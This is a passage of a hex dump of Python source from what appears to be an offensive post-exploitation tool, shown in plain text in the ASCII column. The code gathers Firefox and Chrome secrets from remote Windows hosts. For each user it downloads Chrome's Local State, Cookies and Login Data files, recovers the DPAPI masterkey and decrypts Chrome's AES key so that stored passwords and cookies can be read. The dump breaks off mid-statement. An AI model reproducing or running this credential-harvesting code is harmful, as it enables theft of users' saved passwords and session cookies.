+00005bf0: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+00005c00: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
+00005c10: 2e57 4152 4e49 4e47 7d45 7863 6570 7469  .WARNING}Excepti
+00005c20: 6f6e 2064 6563 7279 7074 696e 6720 426c  on decrypting Bl
+00005c30: 6f62 2066 6f72 207b 6c6f 6361 6c66 696c  ob for {localfil
+00005c40: 657d 2077 6974 6820 4d61 7374 6572 6b65  e} with Masterke
+00005c50: 797b 6263 6f6c 6f72 732e 454e 4443 7d22  y{bcolors.ENDC}"
+00005c60: 290a 0909 0909 0909 0973 656c 662e 6c6f  )........self.lo
+00005c70: 6767 696e 672e 6465 6275 6728 6578 290a  gging.debug(ex).
+00005c80: 0a09 6465 6620 4765 744d 6f7a 696c 6c61  ..def GetMozilla
+00005c90: 5365 6372 6574 735f 7772 6170 7065 7228  Secrets_wrapper(
+00005ca0: 7365 6c66 293a 0a09 0973 656c 662e 6c6f  self):...self.lo
+00005cb0: 6767 696e 672e 696e 666f 2866 225b 7b73  gging.info(f"[{s
+00005cc0: 656c 662e 6f70 7469 6f6e 732e 7461 7267  elf.options.targ
+00005cd0: 6574 5f69 707d 5d20 7b62 636f 6c6f 7273  et_ip}] {bcolors
+00005ce0: 2e4f 4b42 4c55 457d 5b2b 5d20 4761 7468  .OKBLUE}[+] Gath
+00005cf0: 6572 696e 6720 4d6f 7a69 6c6c 6120 5365  ering Mozilla Se
+00005d00: 6372 6574 7320 7b62 636f 6c6f 7273 2e45  crets {bcolors.E
+00005d10: 4e44 437d 2229 0a0a 0909 666f 7220 7573  NDC}")....for us
+00005d20: 6572 2069 6e20 7365 6c66 2e75 7365 7273  er in self.users
+00005d30: 3a0a 0909 0969 6620 7573 6572 2e75 7365  :....if user.use
+00005d40: 726e 616d 6520 3d3d 2027 4d41 4348 494e  rname == 'MACHIN
+00005d50: 4524 273a 0a09 0909 0963 6f6e 7469 6e75  E$':.....continu
+00005d60: 650a 0909 0974 7279 3a0a 0909 0909 6d79  e....try:.....my
+00005d70: 6f70 7469 6f6e 7320 3d20 636f 7079 2e64  options = copy.d
+00005d80: 6565 7063 6f70 7928 7365 6c66 2e6f 7074  eepcopy(self.opt
+00005d90: 696f 6e73 290a 0909 0909 6d79 6f70 7469  ions).....myopti
+00005da0: 6f6e 732e 6669 6c65 203d 204e 6f6e 6520  ons.file = None 
+00005db0: 2023 2022 6368 726f 6d65 5f65 6e63 5f62   # "chrome_enc_b
+00005dc0: 6c6f 622e 746d 7022 2020 2320 424c 4f42  lob.tmp"  # BLOB
+00005dd0: 2074 6f20 7061 7273 650a 0909 0909 6d79   to parse.....my
+00005de0: 6f70 7469 6f6e 732e 6b65 7920 3d20 4e6f  options.key = No
+00005df0: 6e65 0a09 0909 096d 796f 7074 696f 6e73  ne.....myoptions
+00005e00: 2e6d 6173 7465 726b 6579 7320 3d20 4e6f  .masterkeys = No
+00005e10: 6e65 0a09 0909 096d 7946 6972 6566 6f78  ne.....myFirefox
+00005e20: 5365 6372 6574 7320 3d20 4649 5245 464f  Secrets = FIREFO
+00005e30: 585f 4c4f 4749 4e53 286d 796f 7074 696f  X_LOGINS(myoptio
+00005e40: 6e73 2c20 7365 6c66 2e6c 6f67 6769 6e67  ns, self.logging
+00005e50: 2c20 7573 6572 2c20 7365 6c66 2e6d 7966  , user, self.myf
+00005e60: 696c 656f 7073 2c20 7365 6c66 2e64 6229  ileops, self.db)
+00005e70: 0a09 0909 096d 7946 6972 6566 6f78 5365  .....myFirefoxSe
+00005e80: 6372 6574 732e 7275 6e28 290a 0909 0965  crets.run()....e
+00005e90: 7863 6570 7420 4578 6365 7074 696f 6e20  xcept Exception 
+00005ea0: 6173 2065 783a 0a09 0909 0973 656c 662e  as ex:.....self.
+00005eb0: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
+00005ec0: 0909 0909 6622 5b7b 7365 6c66 2e6f 7074  ....f"[{self.opt
+00005ed0: 696f 6e73 2e74 6172 6765 745f 6970 7d5d  ions.target_ip}]
+00005ee0: 207b 6263 6f6c 6f72 732e 5741 524e 494e   {bcolors.WARNIN
+00005ef0: 477d 4578 6365 7074 696f 6e20 4765 744d  G}Exception GetM
+00005f00: 6f7a 696c 6c61 5365 6372 6574 735f 7772  ozillaSecrets_wr
+00005f10: 6170 7065 7220 666f 7220 7b75 7365 722e  apper for {user.
+00005f20: 7573 6572 6e61 6d65 7d20 7b62 636f 6c6f  username} {bcolo
+00005f30: 7273 2e45 4e44 437d 2229 0a09 0909 0973  rs.ENDC}").....s
+00005f40: 656c 662e 6c6f 6767 696e 672e 6465 6275  elf.logging.debu
+00005f50: 6728 6578 290a 0a09 6465 6620 4765 7443  g(ex)...def GetC
+00005f60: 6872 6f6d 6553 6563 7265 7473 2873 656c  hromeSecrets(sel
+00005f70: 6629 3a0a 0909 7365 6c66 2e6c 6f67 6769  f):...self.loggi
+00005f80: 6e67 2e69 6e66 6f28 6622 5b7b 7365 6c66  ng.info(f"[{self
+00005f90: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+00005fa0: 6970 7d5d 207b 6263 6f6c 6f72 732e 4f4b  ip}] {bcolors.OK
+00005fb0: 424c 5545 7d5b 2b5d 2047 6174 6865 7269  BLUE}[+] Gatheri
+00005fc0: 6e67 2043 6872 6f6d 6520 5365 6372 6574  ng Chrome Secret
+00005fd0: 7320 7b62 636f 6c6f 7273 2e45 4e44 437d  s {bcolors.ENDC}
+00005fe0: 2229 0a09 0962 6c61 636b 6c69 7374 203d  ")...blacklist =
+00005ff0: 205b 272e 272c 2027 2e2e 275d 0a09 0923   ['.', '..']...#
+00006000: 2050 6172 7365 2063 6872 6f6d 650a 0909   Parse chrome...
+00006010: 2320 6175 7472 6573 206e 6176 6967 6174  # autres navigat
+00006020: 6575 7273 203f 0a0a 0909 7573 6572 5f64  eurs ?....user_d
+00006030: 6972 6563 746f 7269 6573 203d 205b 2822  irectories = [("
+00006040: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
+00006050: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
+00006060: 6c5c 5c47 6f6f 676c 655c 5c43 6872 6f6d  l\\Google\\Chrom
+00006070: 655c 5c55 7365 7220 4461 7461 222c 2027  e\\User Data", '
+00006080: 4c6f 6361 6c20 5374 6174 6527 2c0a 0909  Local State',...
+00006090: 0909 0909 0920 2743 6872 6f6d 654c 6f63  ..... 'ChromeLoc
+000060a0: 616c 5374 6174 6527 2c20 2744 4f4d 4149  alState', 'DOMAI
+000060b0: 4e27 292c 0a09 0909 0909 0909 2822 5573  N'),........("Us
+000060c0: 6572 735c 5c7b 7573 6572 6e61 6d65 7d5c  ers\\{username}\
+000060d0: 5c41 7070 4461 7461 5c5c 4c6f 6361 6c5c  \AppData\\Local\
+000060e0: 5c47 6f6f 676c 655c 5c43 6872 6f6d 655c  \Google\\Chrome\
+000060f0: 5c55 7365 7220 4461 7461 5c5c 4465 6661  \User Data\\Defa
+00006100: 756c 7422 2c20 2743 6f6f 6b69 6573 272c  ult", 'Cookies',
+00006110: 0a09 0909 0909 0909 2027 4368 726f 6d65  ........ 'Chrome
+00006120: 436f 6f6b 6965 7327 2c20 2744 4f4d 4149  Cookies', 'DOMAI
+00006130: 4e27 292c 0a09 0909 0909 0909 2822 5573  N'),........("Us
+00006140: 6572 735c 5c7b 7573 6572 6e61 6d65 7d5c  ers\\{username}\
+00006150: 5c41 7070 4461 7461 5c5c 4c6f 6361 6c5c  \AppData\\Local\
+00006160: 5c47 6f6f 676c 655c 5c43 6872 6f6d 655c  \Google\\Chrome\
+00006170: 5c55 7365 7220 4461 7461 5c5c 4465 6661  \User Data\\Defa
+00006180: 756c 7422 2c0a 0909 0909 0909 0920 2745  ult",........ 'E
+00006190: 7874 656e 7369 6f6e 2043 6f6f 6b69 6573  xtension Cookies
+000061a0: 272c 2027 4368 726f 6d65 436f 6f6b 6965  ', 'ChromeCookie
+000061b0: 7327 2c20 2744 4f4d 4149 4e27 292c 0a09  s', 'DOMAIN'),..
+000061c0: 0909 0909 0909 280a 0909 0909 0909 0922  ......(........"
+000061d0: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
+000061e0: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
+000061f0: 6c5c 5c47 6f6f 676c 655c 5c43 6872 6f6d  l\\Google\\Chrom
+00006200: 655c 5c55 7365 7220 4461 7461 5c5c 4465  e\\User Data\\De
+00006210: 6661 756c 745c 5c4e 6574 776f 726b 222c  fault\\Network",
+00006220: 2027 436f 6f6b 6965 7327 2c0a 0909 0909   'Cookies',.....
+00006230: 0909 0927 4368 726f 6d65 436f 6f6b 6965  ...'ChromeCookie
+00006240: 7327 2c20 2744 4f4d 4149 4e27 292c 0a09  s', 'DOMAIN'),..
+00006250: 0909 0909 0909 280a 0909 0909 0909 0922  ......(........"
+00006260: 5573 6572 735c 5c7b 7573 6572 6e61 6d65  Users\\{username
+00006270: 7d5c 5c41 7070 4461 7461 5c5c 4c6f 6361  }\\AppData\\Loca
+00006280: 6c5c 5c47 6f6f 676c 655c 5c43 6872 6f6d  l\\Google\\Chrom
+00006290: 655c 5c55 7365 7220 4461 7461 5c5c 4465  e\\User Data\\De
+000062a0: 6661 756c 745c 5c53 6166 6520 4272 6f77  fault\\Safe Brow
+000062b0: 7369 6e67 204e 6574 776f 726b 222c 0a09  sing Network",..
+000062c0: 0909 0909 0909 2753 6166 6520 4272 6f77  ......'Safe Brow
+000062d0: 7369 6e67 2043 6f6f 6b69 6573 272c 2027  sing Cookies', '
+000062e0: 4368 726f 6d65 436f 6f6b 6965 7327 2c20  ChromeCookies', 
+000062f0: 2744 4f4d 4149 4e27 292c 0a09 0909 0909  'DOMAIN'),......
+00006300: 0909 2822 5573 6572 735c 5c7b 7573 6572  ..("Users\\{user
+00006310: 6e61 6d65 7d5c 5c41 7070 4461 7461 5c5c  name}\\AppData\\
+00006320: 4c6f 6361 6c5c 5c47 6f6f 676c 655c 5c43  Local\\Google\\C
+00006330: 6872 6f6d 655c 5c55 7365 7220 4461 7461  hrome\\User Data
+00006340: 5c5c 4465 6661 756c 7422 2c20 274c 6f67  \\Default", 'Log
+00006350: 696e 2044 6174 6127 2c0a 0909 0909 0909  in Data',.......
+00006360: 0920 2743 6872 6f6d 654c 6f67 696e 4461  . 'ChromeLoginDa
+00006370: 7461 272c 2027 444f 4d41 494e 2729 2c0a  ta', 'DOMAIN'),.
+00006380: 0909 0909 0909 0928 2255 7365 7273 5c5c  .......("Users\\
+00006390: 7b75 7365 726e 616d 657d 5c5c 4170 7044  {username}\\AppD
+000063a0: 6174 615c 5c4c 6f63 616c 5c5c 476f 6f67  ata\\Local\\Goog
+000063b0: 6c65 5c5c 4368 726f 6d65 5c5c 5573 6572  le\\Chrome\\User
+000063c0: 2044 6174 6122 2c20 274c 6173 7420 5665   Data", 'Last Ve
+000063d0: 7273 696f 6e27 2c0a 0909 0909 0909 0920  rsion',........ 
+000063e0: 2743 6872 6f6d 6556 6572 7369 6f6e 272c  'ChromeVersion',
+000063f0: 2027 444f 4d41 494e 2729 2c0a 0909 0909   'DOMAIN'),.....
+00006400: 0909 095d 0a0a 0909 666f 7220 7573 6572  ...]....for user
+00006410: 2069 6e20 7365 6c66 2e75 7365 7273 3a0a   in self.users:.
+00006420: 0909 0969 6620 7573 6572 2e75 7365 726e  ...if user.usern
+00006430: 616d 6520 3d3d 2027 4d41 4348 494e 4524  ame == 'MACHINE$
+00006440: 273a 0a09 0909 0963 6f6e 7469 6e75 650a  ':.....continue.
+00006450: 0909 0965 6c73 653a 0a09 0909 0964 6972  ...else:.....dir
+00006460: 6563 746f 7269 6573 5f74 6f5f 7573 6520  ectories_to_use 
+00006470: 3d20 7573 6572 5f64 6972 6563 746f 7269  = user_directori
+00006480: 6573 0a09 0909 096d 796f 7074 696f 6e73  es.....myoptions
+00006490: 203d 2063 6f70 792e 6465 6570 636f 7079   = copy.deepcopy
+000064a0: 2873 656c 662e 6f70 7469 6f6e 7329 0a09  (self.options)..
+000064b0: 0909 096d 796f 7074 696f 6e73 2e66 696c  ...myoptions.fil
+000064c0: 6520 3d20 4e6f 6e65 2020 2320 2263 6872  e = None  # "chr
+000064d0: 6f6d 655f 656e 635f 626c 6f62 2e74 6d70  ome_enc_blob.tmp
+000064e0: 2220 2023 2042 4c4f 4220 746f 2070 6172  "  # BLOB to par
+000064f0: 7365 0a09 0909 096d 796f 7074 696f 6e73  se.....myoptions
+00006500: 2e6b 6579 203d 204e 6f6e 650a 0909 0909  .key = None.....
+00006510: 6d79 6f70 7469 6f6e 732e 6d61 7374 6572  myoptions.master
+00006520: 6b65 7973 203d 204e 6f6e 650a 0909 0909  keys = None.....
+00006530: 6d79 4368 726f 6d65 5365 6372 6574 7320  myChromeSecrets 
+00006540: 3d20 4348 524f 4d45 5f4c 4f47 494e 5328  = CHROME_LOGINS(
+00006550: 6d79 6f70 7469 6f6e 732c 2073 656c 662e  myoptions, self.
+00006560: 6c6f 6767 696e 672c 2073 656c 662e 6462  logging, self.db
+00006570: 2c20 7573 6572 2e75 7365 726e 616d 6529  , user.username)
+00006580: 0a0a 0909 0923 2069 6620 6c65 6e28 7573  .....# if len(us
+00006590: 6572 2e6d 6173 7465 726b 6579 7329 3e30  er.masterkeys)>0
+000065a0: 3a23 5061 7320 6465 206d 6173 7465 726b  :#Pas de masterk
+000065b0: 6579 733d 3d70 6173 2064 6520 6461 7461  eys==pas de data
+000065c0: 7320 6120 7265 6375 700a 0909 0966 6f72  s a recup....for
+000065d0: 2069 6e66 6f20 696e 2064 6972 6563 746f   info in directo
+000065e0: 7269 6573 5f74 6f5f 7573 653a 0a09 0909  ries_to_use:....
+000065f0: 096d 795f 6469 722c 206d 795f 6d61 736b  .my_dir, my_mask
+00006600: 2c20 6d79 5f62 6c6f 625f 7479 7065 2c20  , my_blob_type, 
+00006610: 6d79 5f75 7365 725f 7479 7065 203d 2069  my_user_type = i
+00006620: 6e66 6f0a 0909 0909 746d 705f 7077 6420  nfo.....tmp_pwd 
+00006630: 3d20 6d79 5f64 6972 2e66 6f72 6d61 7428  = my_dir.format(
+00006640: 0a09 0909 0909 7573 6572 6e61 6d65 3d75  ......username=u
+00006650: 7365 722e 7573 6572 6e61 6d65 2920 2023  ser.username)  #
+00006660: 2074 6d70 5f70 7764 203d 2066 2255 7365   tmp_pwd = f"Use
+00006670: 7273 5c5c 7b75 7365 722e 7573 6572 6e61  rs\\{user.userna
+00006680: 6d65 7d5c 5c7b 6d79 5f64 6972 7d22 236e  me}\\{my_dir}"#n
+00006690: 7470 6174 682e 6a6f 696e 286e 7470 6174  tpath.join(ntpat
+000066a0: 682e 6a6f 696e 2827 5573 6572 7327 2c20  h.join('Users', 
+000066b0: 7573 6572 2e75 7365 726e 616d 6529 2c20  user.username), 
+000066c0: 6d79 5f64 6972 290a 0909 0909 7365 6c66  my_dir).....self
+000066d0: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
+000066e0: 0909 0909 0966 225b 7b73 656c 662e 6f70  .....f"[{self.op
+000066f0: 7469 6f6e 732e 7461 7267 6574 5f69 707d  tions.target_ip}
+00006700: 5d20 4c6f 6f6b 696e 6720 666f 7220 7b75  ] Looking for {u
+00006710: 7365 722e 7573 6572 6e61 6d65 7d20 6669  ser.username} fi
+00006720: 6c65 7320 696e 207b 746d 705f 7077 647d  les in {tmp_pwd}
+00006730: 2077 6974 6820 6d61 736b 207b 6d79 5f6d   with mask {my_m
+00006740: 6173 6b7d 2229 0a09 0909 096d 795f 6469  ask}").....my_di
+00006750: 7265 6374 6f72 7920 3d20 7365 6c66 2e6d  rectory = self.m
+00006760: 7966 696c 656f 7073 2e64 6f5f 6c73 2874  yfileops.do_ls(t
+00006770: 6d70 5f70 7764 2c20 6d79 5f6d 6173 6b2c  mp_pwd, my_mask,
+00006780: 2064 6973 706c 6179 3d46 616c 7365 290a   display=False).
+00006790: 0909 0909 666f 7220 696e 666f 7320 696e  ....for infos in
+000067a0: 206d 795f 6469 7265 6374 6f72 793a 0a09   my_directory:..
+000067b0: 0909 0909 6c6f 6e67 6e61 6d65 2c20 6973  ....longname, is
+000067c0: 5f64 6972 6563 746f 7279 203d 2069 6e66  _directory = inf
+000067d0: 6f73 0a09 0909 0909 7365 6c66 2e6c 6f67  os......self.log
+000067e0: 6769 6e67 2e64 6562 7567 2822 6c73 2072  ging.debug("ls r
+000067f0: 6574 7572 6e65 6420 6669 6c65 2025 7322  eturned file %s"
+00006800: 2025 206c 6f6e 676e 616d 6529 0a09 0909   % longname)....
+00006810: 0909 6966 206c 6f6e 676e 616d 6520 6e6f  ..if longname no
+00006820: 7420 696e 2062 6c61 636b 6c69 7374 2061  t in blacklist a
+00006830: 6e64 206e 6f74 2069 735f 6469 7265 6374  nd not is_direct
+00006840: 6f72 793a 0a09 0909 0909 0974 7279 3a0a  ory:.......try:.
+00006850: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
+00006860: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
+00006870: 0909 0966 225b 7b73 656c 662e 6f70 7469  ...f"[{self.opti
+00006880: 6f6e 732e 7461 7267 6574 5f69 707d 5d20  ons.target_ip}] 
+00006890: 5b2b 5d20 466f 756e 6420 7b62 636f 6c6f  [+] Found {bcolo
+000068a0: 7273 2e4f 4b42 4c55 457d 7b75 7365 722e  rs.OKBLUE}{user.
+000068b0: 7573 6572 6e61 6d65 7d7b 6263 6f6c 6f72  username}{bcolor
+000068c0: 732e 454e 4443 7d20 4368 726f 6d65 2066  s.ENDC} Chrome f
+000068d0: 696c 6573 203a 207b 6c6f 6e67 6e61 6d65  iles : {longname
+000068e0: 7d22 290a 0909 0909 0909 0923 2044 6f77  }")........# Dow
+000068f0: 6e6c 6f61 6469 6e67 2042 6c6f 6220 6669  nloading Blob fi
+00006900: 6c65 0a09 0909 0909 0909 6c6f 6361 6c66  le........localf
+00006910: 696c 6520 3d20 7365 6c66 2e6d 7966 696c  ile = self.myfil
+00006920: 656f 7073 2e67 6574 5f66 696c 6528 6e74  eops.get_file(nt
+00006930: 7061 7468 2e6a 6f69 6e28 746d 705f 7077  path.join(tmp_pw
+00006940: 642c 206c 6f6e 676e 616d 6529 2c20 616c  d, longname), al
+00006950: 6c6f 775f 6163 6365 7373 5f65 7272 6f72  low_access_error
+00006960: 3d54 7275 6529 0a09 0909 0909 0909 2320  =True)........# 
+00006970: 6d79 6f70 7469 6f6e 7320 3d20 636f 7079  myoptions = copy
+00006980: 2e64 6565 7063 6f70 7928 7365 6c66 2e6f  .deepcopy(self.o
+00006990: 7074 696f 6e73 290a 0909 0909 0909 0969  ptions)........i
+000069a0: 6620 6d79 5f62 6c6f 625f 7479 7065 203d  f my_blob_type =
+000069b0: 3d20 2743 6872 6f6d 654c 6f63 616c 5374  = 'ChromeLocalSt
+000069c0: 6174 6527 3a0a 0909 0909 0909 0909 7472  ate':.........tr
+000069d0: 793a 0a09 0909 0909 0909 0909 6d79 4368  y:..........myCh
+000069e0: 726f 6d65 5365 6372 6574 732e 6c6f 6361  romeSecrets.loca
+000069f0: 6c73 7461 7465 5f70 6174 6820 3d20 6c6f  lstate_path = lo
+00006a00: 6361 6c66 696c 650a 0909 0909 0909 0909  calfile.........
+00006a10: 0967 7569 6420 3d20 6d79 4368 726f 6d65  .guid = myChrome
+00006a20: 5365 6372 6574 732e 6765 745f 6d61 7374  Secrets.get_mast
+00006a30: 6572 6b65 795f 6775 6964 5f66 726f 6d5f  erkey_guid_from_
+00006a40: 6c6f 6361 6c73 7461 7465 2829 0a09 0909  localstate()....
+00006a50: 0909 0909 0909 6966 2067 7569 6420 213d  ......if guid !=
+00006a60: 204e 6f6e 653a 0a09 0909 0909 0909 0909   None:..........
+00006a70: 096d 6173 7465 726b 6579 203d 2073 656c  .masterkey = sel
+00006a80: 662e 6765 745f 6d61 7374 6572 6b65 7928  f.get_masterkey(
+00006a90: 7573 6572 3d75 7365 722c 2067 7569 643d  user=user, guid=
+00006aa0: 6775 6964 2c20 7479 7065 3d6d 795f 7573  guid, type=my_us
+00006ab0: 6572 5f74 7970 6529 0a09 0909 0909 0909  er_type)........
+00006ac0: 0909 0969 6620 6d61 7374 6572 6b65 7920  ...if masterkey 
+00006ad0: 213d 204e 6f6e 653a 0a09 0909 0909 0909  != None:........
+00006ae0: 0909 0909 6966 206d 6173 7465 726b 6579  ....if masterkey
+00006af0: 5b27 7374 6174 7573 275d 203d 3d20 2764  ['status'] == 'd
+00006b00: 6563 7279 7074 6564 273a 0a09 0909 0909  ecrypted':......
+00006b10: 0909 0909 0909 096d 7943 6872 6f6d 6553  .......myChromeS
+00006b20: 6563 7265 7473 2e6d 6173 7465 726b 6579  ecrets.masterkey
+00006b30: 203d 206d 6173 7465 726b 6579 5b27 6b65   = masterkey['ke
+00006b40: 7927 5d0a 0909 0909 0909 0909 0909 0909  y'].............
+00006b50: 6165 734b 6579 203d 206d 7943 6872 6f6d  aesKey = myChrom
+00006b60: 6553 6563 7265 7473 2e67 6574 5f41 4553  eSecrets.get_AES
+00006b70: 5f6b 6579 5f66 726f 6d5f 6c6f 6361 6c73  _key_from_locals
+00006b80: 7461 7465 280a 0909 0909 0909 0909 0909  tate(...........
+00006b90: 0909 096d 6173 7465 726b 6579 3d6d 6173  ...masterkey=mas
+00006ba0: 7465 726b 6579 5b27 6b65 7927 5d29 0a09  terkey['key'])..
+00006bb0: 0909 0909 0909 0909 0909 0969 6620 6165  ...........if ae
+00006bc0: 734b 6579 2021 3d20 4e6f 6e65 3a0a 0909  sKey != None:...
+00006bd0: 0909 0909 0909 0909 0909 0973 656c 662e  ...........self.
+00006be0: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
+00006bf0: 0909 0909 0909 0909 0909 0909 0966 225b  .............f"[
+00006c00: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
+00006c10: 7267 6574 5f69 707d 5d20 7b62 636f 6c6f  rget_ip}] {bcolo
+00006c20: 7273 2e4f 4b47 5245 454e 7d44 6563 7279  rs.OKGREEN}Decry
+00006c30: 7074 696f 6e20 7375 6363 6573 7366 756c  ption successful
+00006c40: 6c20 6f66 207b 6263 6f6c 6f72 732e 4f4b  l of {bcolors.OK
+00006c50: 424c 5545 7d7b 7573 6572 2e75 7365 726e  BLUE}{user.usern
+00006c60: 616d 657d 7b62 636f 6c6f 7273 2e45 4e44  ame}{bcolors.END
+00006c70: 437d 2043 6872 6f6d 6520 4145 5320 4b65  C} Chrome AES Ke
+00006c80: 7920 7b61 6573 4b65 797d 207b 6263 6f6c  y {aesKey} {bcol
+00006c90: 6f72 732e 454e 4443 7d22 290a 0909 0909  ors.ENDC}").....
+00006ca0: 0909 0909 0909 0909 656c 7365 3a0a 0909  ........else:...
+00006cb0: 0909 0909 0909 0909 0909 0973 656c 662e  ...........self.
+00006cc0: 6c6f 6767 696e 672e 6465 6275 6728 0a09  logging.debug(..
+00006cd0: 0909 0909 0909 0909 0909 0909 0966 225b  .............f"[
+00006ce0: 7b73 656c 662e 6f70 7469 6f6e 732e 7461  {self.options.ta
+00006cf0: 7267 6574 5f69 707d 5d20 7b62 636f 6c6f  rget_ip}] {bcolo
+00006d00: 7273 2e57 4152 4e49 4e47 7d45 7272 6f72  rs.WARNING}Error
+00006d10: 2064 6563 7279 7074 696e 6720 4145 5320   decrypting AES 
+00006d20: 4b65 7920 666f 7220 4368 726f 6d65 204c  Key for Chrome L
+00006d30: 6f63 616c 2053 7461 7465 2077 6974 6820  ocal State with 
+00006d40: 4d61 7374 6572 6b65 797b 6263 6f6c 6f72  Masterkey{bcolor
+00006d50: 732e 454e 4443 7d22 290a 0909 0909 0909  s.ENDC}").......
+00006d60: 0909 0909 0965 6c73 653a 0a09 0909 0909  .....else:......
+00006d70: 0909 0909 0909 0973 656c 662e 6c6f 6767  .......self.logg
+00006d80: 696e 672e 6465 6275 6728 0a09 0909 0909  ing.debug(......
+00006d90: 0909 0909 0909 0909 6622 5b7b 7365 6c66  ........f"[{self
+00006da0: 2e6f 7074 696f 6e73 2e74 6172 6765 745f  .options.target_
+00006db0: 6970 7d5d 207b 6263 6f6c 6f72 732e 5741  ip}] {bcolors.WA
+00006dc0: 524e 494e 477d 4572 726f 7220 6465 6372  RNING}Error decr
+00006dd0: 7970 7469 6e67 2041 4553 204b 6579 2066  ypting AES Key f
+00006de0: 6f72 2043 6872 6f6d 6520 4c6f 6361 6c20  or Chrome Local 
+00006df0: 5374 6174 6520 202d 204d 6173 7465 726b  State  - Masterk
+00006e00: 6579 206e 6f74 2064 6563 7279 7074 6564  ey not decrypted
+00006e10: 7b62 636f 6c6f 7273 2e45 4e44 437d 2229  {bcolors.ENDC}")
+00006e20: 0a09 0909 0909 0909 0909 0965 6c73 653a  ...........else:
+00006e30: 0a09 0909 0909 0909 0909 0909 7365 6c66  ............self
+00006e40: 2e6c 6f67 6769 6e67 2e64 6562 7567 280a  .logging.debug(.
+00006e50: 0909 0909 0909 0909 0909 0909 6622 5b7b  ............f"[{
+00006e60: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+00006e70: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
+00006e80: 732e 5741 524e 494e 477d 4572 726f 7220  s.WARNING}Error 
+00006e90: 6465 6372 7970 7469 6e67 2041 4553 204b  decrypting AES K
+00006ea0: 6579 2066 6f72 2043 6872 6f6d 6520 4c6f  ey for Chrome Lo
+00006eb0: 6361 6c20 5374 6174 6520 7769 7468 204d  cal State with M
+00006ec0: 6173 7465 726b 6579 2d20 6361 6e74 2067  asterkey- cant g
+00006ed0: 6574 206d 6173 7465 726b 6579 207b 6775  et masterkey {gu
+00006ee0: 6964 7d7b 6263 6f6c 6f72 732e 454e 4443  id}{bcolors.ENDC
+00006ef0: 7d22 290a 0909 0909 0909 0909 0965 6c73  }")..........els
+00006f00: 653a 0a09 0909 0909 0909 0909 0973 656c  e:...........sel
+00006f10: 662e 6c6f 6767 696e 672e 6465 6275 6728  f.logging.debug(
+00006f20: 0a09 0909 0909 0909 0909 0909 6622 5b7b  ............f"[{
+00006f30: 7365 6c66 2e6f 7074 696f 6e73 2e74 6172  self.options.tar
+00006f40: 6765 745f 6970 7d5d 207b 6263 6f6c 6f72  get_ip}] {bcolor
+00006f50: 732e 5741 524e 494e 477d 4572 726f 7220  s.WARNING}Error 
+00006f60: 6465 6372 7970 7469 6e67 2041 4553 204b  decrypting AES K
+00006f70: 6579 2066 6f72 2043 6872 6f6d 6520 4c6f  ey for Chrome Lo
+00006f80: 6361 6c20 5374 6174 6520 7769 7468 204d  cal State with M
+00006f90: 6173 7465 726b 6579 202d 2063 616e 2074  asterkey - can t
+00006fa0: 2067 6574 2074 6865 2047 5549 4420 6f66   get the GUID of
+00006fb0: 206d 6173 7465 726b 6579 2066 726f 6d20   masterkey from 
+00006fc0: 626c 6f62 2066 696c 657b 6263 6f6c 6f72  blob file{bcolor
+00006fd0: 732e 454e 4443 7d22 290a 0909 0909 0909  s.ENDC}").......
+00006fe0: 0909 6578 6365 7074 2045 7863 6570 7469  ..except Excepti
+00006ff0: 6f6e 2061 7320 6578 3a0a 0909 0909 0909  on as ex:.......
+00007000: 0909 0973 656c 662e 6c6f 6767 696e 672e  ...self.logging.
+00007010: 6465 6275 6728 0a09 0909 0909 0909 0909  debug(..........
+00007020: 0966 225b 7b73 656c 662e 6f70 7469 6f6e  .f"[{self.option
+00007030: 732e 7461 7267 6574 5f69 707d 5d20 7b62  s.target_ip}] {b
+00007040: 636f 6c6f 7273 2e57 4152 4e49 4e47 7d45  colors.WARNING}E
+00007050: 7863 6570 7469 6f6e 2069 6e20 4368 726f  xception in Chro
+00007060: 6d65 4c6f 6361 6c53 7461 7465 7b62 636f  meLocalState{bco
+00007070: 6c6f 7273 2e45 4e44 437d 2229 0a09 0909  lors.ENDC}")....
+00007080: 0909 0909 0909 7365 6c66 2e6c 6f67 6769  ......self.loggi
+00007090: 6e67 2e64 6562 7567 2865 7829 0a09 0909  ng.debug(ex)....
+000070a0: 0909 0909 6966 206d 795f 626c 6f62 5f74  ....if my_blob_t
+000070b0: 7970 6520 3d3d 2027 4368 726f 6d65 4c6f  ype == 'ChromeLo
+000070c0: 6769 6e44 6174 6127 3a0a 0909 0909 0909  ginData':.......
+000070d0: 0909 7472 793a 0a09 0909 0909 0909 0909  ..try:..........
+000070e0: 6d79 4368 726f 6d65 5365 6372 6574 732e  myChromeSecrets.
+000070f0: 6c6f 6769 6e64 6174 615f 7061 7468 203d  logindata_path =
+00007100: 206c 6f63 616c 6669 6c65 0a09 0909 0909   localfile......
+00007110: 0909 0909 7573 6572 2e66 696c 6573 5b6c  ....user.files[l
+00007120: 6f6e 676e 616d 655d 203d 207b 7d0a 0909  ongname] = {}...
+00007130: 0909 0909 0909 0975 7365 722e 6669 6c65  .......user.file
+00007140: 735b 6c6f 6e67 6e61 6d65 5d5b 2774 7970  s[longname]['typ
+00007150: 6527 5d20 3d20 6d79 5f62 6c6f 625f 7479  e'] = my_blob_ty
+00007160: 7065 0a09 0909 0909 0909 0909 7573 6572  pe..........user
+00007170: 2e66 696c 6573 5b6c 6f6e 676e 616d 655d  .files[longname]
+00007180: 5b27 7374 6174 7573 275d 203d 2027 656e  ['status'] = 'en
+00007190: 6372 7970 7465 6427 0a09 0909 0909 0909  crypted'........
+000071a0: 0909 7573 6572 2e66 696c 6573 5b6c 6f6e  ..user.files[lon
